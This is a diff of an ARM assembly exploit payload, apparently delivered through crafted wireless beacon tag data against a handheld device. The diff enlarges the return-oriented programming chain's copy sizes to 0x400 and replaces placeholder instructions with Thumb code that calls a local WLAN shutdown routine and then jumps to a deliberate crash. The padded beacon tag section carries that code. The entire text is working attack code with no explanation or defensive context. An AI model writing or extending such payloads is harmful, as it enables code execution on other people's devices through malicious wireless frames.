@@ -17,7 +17,7 @@ ropstart:
 .word POP_R0R4SLIPPC
 .word TMPBUF_ADR @ r0, dst
 .word (arm11code-_start) + BEACONTAGDATA_OUITYPE80_ADR @ r1, src
-.word arm11code_end-arm11code @ r2, size
+.word 0x400 @ r2, size
 .word 0 @ r3
 .word 0 @ r4
 .word 0 @ sl
@@ -27,7 +27,7 @@ ropstart:
 
 .word POP_R0R4SLIPPC
 .word TMPBUF_ADR @ r0, buf
-.word 0x100 @ r1, size
+.word 0x400 @ r1, size
 .word 0 @ r2
 .word 0 @ r3
 .word 0 @ r4
@@ -42,7 +42,7 @@ ropstart:
 .word POP_R0R4SLIPPC
 .word TMPBUF_ADR @ r0, srcaddr
 .word 0x30000000+TEXT_FCRAMOFFSET @ r1, dstaddr
-.word 0x100 @ r2, size
+.word 0x400 @ r2, size
 .word 0 @ r3, width0
 .word 0 @ r4
 .word 0 @ sl
@@ -75,15 +75,31 @@ ropstart:
 .word 0x00100000
 
 arm11code:
-nop
-nop
-nop
-nop
-.word 0xffffffff
+add r1, pc, #1
+bx r1
+.thumb
 
-.word 0x40404040
+ldr r0, =LOCALWLAN_SHUTDOWN
+blx r0
 
-arm11code_end:
+blx crasharm
+
+.pool
 
 .fill ((_start + 0xfc) - .), 1, 0xffffffff
+.byte 0xff, 0xff @ Pad the tag-data to 0xfe-bytes.
+.byte 0xff, 0xff @ Padding, tagid/tagsize bytes would be located here in memory.
+
+tag1:
+.byte 0x00, 0x1f, 0x32 @ OUI
+.byte 0x81 @ OUI type
+
+tag1_code:
+
+.arm
+crasharm:
+.word 0xffffffff
+
+.fill ((tag1 + 0xfc) - .), 1, 0xffffffff
+.byte 0xff, 0xff
 
